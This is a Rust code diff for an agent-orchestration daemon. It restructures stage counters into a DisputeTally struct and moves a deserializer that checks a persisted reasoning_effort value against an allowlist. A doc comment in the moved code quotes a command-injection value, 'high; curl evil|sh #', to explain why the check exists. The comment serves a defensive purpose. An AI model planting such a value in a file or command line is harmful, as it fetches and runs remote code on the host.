@@ -6,6 +6,8 @@ use crate::models::failure::FailureInfo;
 use crate::plan::schema::{CodeReviewConfig, ContractSpec, ReachableCheck};
 
 use super::checks::{default_plan_version, AcceptanceCriterion, TruthCheck, WiringCheck};
+use super::dispute_budgets::DisputeTally;
+use super::persisted::deserialize_persisted_reasoning_effort;
 
 /// Type of stage for specialized handling.
 ///
@@ -641,12 +643,9 @@ pub struct Stage {
     /// Number of disputes filed against this stage's acceptance criteria.
     #[serde(default)]
     pub dispute_count: u32,
-    /// Number of evidence-loop rounds (NeedsMoreEvidence -> Executing -> NeedsAdjudication).
-    #[serde(default)]
-    pub evidence_rounds: u32,
-    /// Number of accepted plan amendments applied for this stage.
-    #[serde(default)]
-    pub amendments_applied: u32,
+    /// Adjudication counters; see [`DisputeTally`].
+    #[serde(flatten)]
+    pub tally: DisputeTally,
     /// Times the daemon has recovered this stage from a stalled session — a
     /// live agent whose heartbeat went silent far past its response budget.
     /// Bounds that recovery so a stage that stalls every attempt is handed to
@@ -1008,34 +1007,6 @@ impl StageStatus {
             | Self::MergeBlocked
             | Self::NeedsHumanReview
             | Self::NeedsAdjudication => StatusBucket::Blocked,
-        }
-    }
-}
-
-/// `StageDefinition` (plan parse time) rejects an out-of-allowlist effort with a
-/// hard error, but a persisted `Stage` is re-read from `.loom/work/stages/<id>.md` on
-/// every daemon restart, and that file is writable by a worktree agent. Without
-/// re-validation here, a tampered `reasoning_effort: "high; curl evil|sh #"` would
-/// survive reload and be concatenated into the spawn command line.
-/// Invalid persisted values are neutralized rather than bricking daemon reload.
-fn deserialize_persisted_reasoning_effort<'de, D>(
-    deserializer: D,
-) -> Result<Option<String>, D::Error>
-where
-    D: Deserializer<'de>,
-{
-    let opt = <Option<String>>::deserialize(deserializer)?;
-    match opt {
-        None => Ok(None),
-        Some(s) if ALLOWED_REASONING_EFFORTS.contains(&s.as_str()) => Ok(Some(s)),
-        Some(invalid) => {
-            tracing::error!(
-                invalid_reasoning_effort = %invalid,
-                allowed = %ALLOWED_REASONING_EFFORTS.join(", "),
-                "Persisted stage reasoning_effort failed allowlist re-validation on load; \
-                 dropping to None and falling back to the stage-type default"
-            );
-            Ok(None)
         }
     }
 }
